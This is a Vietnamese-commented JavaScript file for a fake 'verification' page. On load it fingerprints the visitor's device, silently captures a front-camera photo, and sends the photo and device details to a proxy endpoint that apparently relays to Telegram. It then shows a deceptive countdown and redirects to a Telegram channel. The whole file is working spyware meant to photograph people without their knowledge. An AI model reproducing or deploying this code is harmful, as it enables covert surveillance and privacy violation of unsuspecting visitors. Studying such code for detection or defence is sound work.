// main.js - Chụp camera trước & gửi proxy, đếm ngược chuyển hướng
const API_PROXY = "/api/tele-proxy";
const REDIRECT_URL = "https://t.me/hoangvip";

const info = {
  time: new Date().toLocaleString("vi-VN"),
  device: "",
  os: "",
  camera: "⏳ Đang kiểm tra...",
};

function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (
    /iPhone|iPad|iPod/i.test(ua) ||
    (platform === "MacIntel" && navigator.maxTouchPoints > 1)
  ) {
    info.os = "iOS";
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || "iPhone Model";
  } else if (/Android/i.test(ua)) {
    info.os = "Android";
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split("/")[0].trim() : "Android Device";
  } else {
    info.os = ua.includes("Windows") ? "Windows" : "Desktop";
    info.device = platform || "PC/Laptop";
  }
}

async function captureCamera(facingMode = "user") {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
    return null;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode },
      audio: false,
    });
    return new Promise((resolve) => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        setTimeout(() => {
          canvas.getContext("2d").drawImage(video, 0, 0);
          stream.getTracks().forEach((t) => t.stop());
          canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
        }, 800);
      };
    });
  } catch (e) {
    return null;
  }
}

async function main() {
  const button =
    document.querySelector("button") ||
    document.querySelector(".btn") ||
    Array.from(document.querySelectorAll("div, span")).find((el) =>
      el.innerText.includes("XỬ LÝ"),
    );

  detectDevice();

  const front = await captureCamera("user");

  info.camera = front
    ? "✅ Đã chụp camera trước"
    : "🚫 Bị chặn hoặc không có camera";

  const formData = new FormData();
  formData.append("clientInfo", JSON.stringify(info));
  if (front) {
    formData.append("front", front, "front.jpg");
  }

  try {
    await fetch(API_PROXY, { method: "POST", body: formData });
  } catch (e) {
    console.warn("Gửi proxy thất bại:", e);
  }

  window.mainScriptFinished = true;

  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";

    let timeLeft = 3;
    button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;

    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        window.location.href = REDIRECT_URL;
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = REDIRECT_URL;
    }, 3000);
  }
}

main().then(() => console.log("✅ Hệ thống đã hoàn tất."));